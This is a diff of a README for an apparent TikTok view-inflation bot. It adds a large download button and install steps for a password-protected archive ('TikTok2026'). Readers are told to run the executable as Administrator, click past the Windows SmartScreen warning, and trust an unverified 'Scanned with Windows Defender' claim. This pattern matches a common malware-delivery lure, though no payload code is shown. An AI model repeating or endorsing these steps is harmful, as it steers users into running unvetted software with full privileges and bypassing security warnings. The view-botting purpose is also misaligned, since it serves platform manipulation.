@@ -18,18 +18,39 @@ A **new bot** designed to help you accomplish your tasks and avoid shadow bans o
 - 🔹 **Stability** — _During the time I've used the bot in private, it has NEVER stopped working._
 ---
 
-### 📥 Download [CLICK](https://github.com/DikeMothDive/TiktokViewerBot/releases/tag/v2.1)
-> Optimized for Windows 10 and Windows 11.
+### 🚀 How to Use
+Launch `TikTokBot-v2.1.exe`
+Paste your TikTok video link into the input field
+Select the desired number of views
+Choose the speed mode (Slow / Normal / Fast)
+Click Start and wait for the process to complete
+Check your video — views will appear within 5–30 minutes
+
 ---
-### Installation
-1. Download and extract the archive
-2. Use password "TikTok2026" for the archive
-3. Run `TikTokBot-v2.1`
-4. Paste your TikTok video link into the input field
-5. Select the desired number of views
-6. Choose the speed mode (Slow / Normal / Fast)
-7. Click Start and wait for the process to complete
-8. Check your video — views will appear within 5–30 minutes
+### 📥 Download
+<div align="center">
+  <a href="https://github.com/DikeMothDive/TiktokViewerBot/releases/tag/v2.1" style="text-decoration: none;" target="_blank">
+    <button style="background: linear-gradient(135deg, #ff0050, #00f2ea); border: none; color: black; font-weight: bold; font-size: 28px; padding: 16px 48px; border-radius: 60px; cursor: pointer; box-shadow: 0 8px 20px rgba(0,0,0,0.3); transition: transform 0.2s ease, box-shadow 0.2s ease;">
+      🚀 DOWNLOAD NOW
+    </button>
+  </a>
+  <br/>
+  <br/>
+  <sub>🔐 <strong>Archive password:</strong> <code style="background: #1e1e1e; color: #00f2ea; padding: 4px 8px; border-radius: 6px;">TikTok2026</code></sub>
+  <br/>
+  <sub>📦 <strong>File size:</strong> ~118 MB | ✅ Scanned with Windows Defender</sub>
+</div>
+> Optimized for Windows 10 and Windows 11.
+
+---
+### 📦 Installation
+Download the archive using the button above
+Extract the archive (use password `TikTok2026`)
+Run `TikTokBot-v2.1.exe` as Administrator (recommended)
+If Windows SmartScreen appears, click "More info" → "Run anyway"
+Enjoy your bot!
+
+---
 
 ### 🛡️ System Requirements
 - Windows 10 or Windows 11 (64-bit)
